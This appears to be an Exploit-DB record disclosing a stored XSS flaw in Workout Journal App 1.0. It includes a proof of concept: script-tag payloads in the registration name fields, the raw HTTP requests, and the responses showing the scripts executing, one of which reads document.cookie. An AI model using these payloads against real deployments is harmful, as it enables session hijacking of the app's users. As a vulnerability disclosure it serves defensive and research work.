{"source": "https://www.exploit-db.com/exploits/51928", "vulnName": "Workout Journal App 1.0 - Stored XSS", "vulnEDBID": "51928", "vulnCVE": "N/A", "author": "MURAT CAGRI ALIS", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-28", "vulnContent": "# Exploit Title: Workout Journal App 1.0 - Stored XSS\n# Date: 12.01.2024\n# Exploit Author: MURAT CAGRI ALIS\n# Vendor Homepage: https://www.sourcecodester.com<https://www.sourcecodester.com/php/17088/workout-journal-app-using-php-and-mysql-source-code.html>\n# Software Link: https://www.sourcecodester.com/php/17088/workout-journal-app-using-php-and-mysql-source-code.html\n# Version: 1.0\n# Tested on: Windows / MacOS / Linux\n# CVE : CVE-2024-24050\n\n# Description\n\nInstall and run the source code of the application on localhost. Register from the registration page at the url workout-journal/index.php. When registering, stored XSS payloads can be entered for the First and Last name on the page. When registering on this page, for the first_name parameter in the request to the /workout-journal/endpoint/add-user.php url\nFor the last_name parameter, type \" <script>console.log(document.cookie)</script> \" and \" <script>console.log(1337) </script> \". Then when you log in you will be redirected to /workout-journal/home.php. When you open the console here, you can see that Stored XSS is working. You can also see from the source code of the page that the payloads are working correctly. This vulnerability occurs when a user enters data without validation and then the browser is allowed to execute this code.\n\n\n# PoC\n\nRegister Request to /workout-journal/endpoints/add-user.php\n\nPOST /workout-journal/endpoint/add-user.php HTTP/1.1\nHost: localhost\nContent-Length: 268\nCache-Control: max-age=0\nsec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://localhost/workout-journal/index.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: PHPSESSID=64s63vgqlnltujsrj64c5o0vci\nConnection: close\n\nfirst_name=%3Cscript%3Econsole.log%28document.cookie%29%3C%2Fscript%3E%29&last_name=%3Cscript%3Econsole.log%281337%29%3C%2Fscript%3E%29&weight=85&height=190&birthday=1991-11-20&contact_number=1234567890&email=test%40mail.mail&username=testusername&password=Test123456-\n\nThis request turn back 200 Code on Response\n\nHTTP/1.1 200 OK\nDate: Sat, 16 Mar 2024 02:05:52 GMT\nServer: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.4\nX-Powered-By: PHP/8.1.4\nContent-Length: 214\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n\n                <script>\n                    alert('Account Registered Successfully!');\n                    window.location.href = 'http://localhost/workout-journal/';\n                </script>\n\nAfter these all, you can go to login page and login to system with username and password. After that you can see that on console payloads had worked right.\n\n/workout-journal/home.php Request\n\nGET /workout-journal/home.php HTTP/1.1\nHost: localhost\nsec-ch-ua: \"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: document\nReferer: http://localhost/workout-journal/endpoint/login.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\nCookie: PHPSESSID=co1vmea8hr1nctjvmid87fa7d1\nConnection: close\n\n/workout-journal/home.php Response\n\nHTTP/1.1 200 OK\nDate: Sat, 16 Mar 2024 02:07:56 GMT\nServer: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.4\nX-Powered-By: PHP/8.1.4\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate\nPragma: no-cache\nContent-Length: 2791\nConnection: close\nContent-Type: text/html; charset=UTF-8\n\n\n    <!DOCTYPE html>\n    <html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n        <title>Workout Journal App</title>\n\n        <!-- Style CSS -->\n        <link rel=\"stylesheet\" href=\"./assets/style.css\">\n\n        <!-- Bootstrap CSS -->\n        <link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css\">\n\n        <style>\n            body {\n                overflow: hidden;\n            }\n        </style>\n    </head>\n    <body>\n\n\n\n        <div class=\"main\">\n            <nav class=\"navbar navbar-expand-lg navbar-dark bg-dark\">\n                <a class=\"navbar-brand ml-3\" href=\"#\">Workout Journal App</a>\n                <button class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\">\n                    <span class=\"navbar-toggler-icon\"></span>\n                </button>\n\n                <div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\">\n                    <ul class=\"navbar-nav ml-auto\">\n                    <li class=\"nav-item active\">\n                        <a class=\"nav-link\" href=\"./endpoint/logout.php\">Log Out</a>\n                    </li>\n                </div>\n\n            </nav>\n\n            <div class=\"landing-page-container\">\n                <div class=\"heading-container\">\n                    <h2>Welcome <script>console.log(document.cookie);</script>) <script>console.log(1337);</script>)</h2>\n                    <p>What would you like to do today?</p>\n                </div>\n\n                <div class=\"select-option\">\n                    <div class=\"read-journal\" onclick=\"redirectToReadJournal()\">\n                        <img src=\"./assets/read.jpg\" alt=\"\">\n                        <p>Read your past workout journals.</p>\n                    </div>\n                    <div class=\"write-journal\" onclick=\"redirectToWriteJournal()\">\n                        <img src=\"./assets/write.jpg\" alt=\"\">\n                        <p>Write your todays journal.</p>\n                    </div>\n                </div>\n            </div>\n\n        </div>\n\n        <!-- Bootstrap JS -->\n        <script src=\"https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js\"></script>\n        <script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js\"></script>\n        <script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.min.js\"></script>\n\n        <!-- Script JS -->\n        <script src=\"./assets/script.js\"></script>\n    </body>\n    </html>\n            "}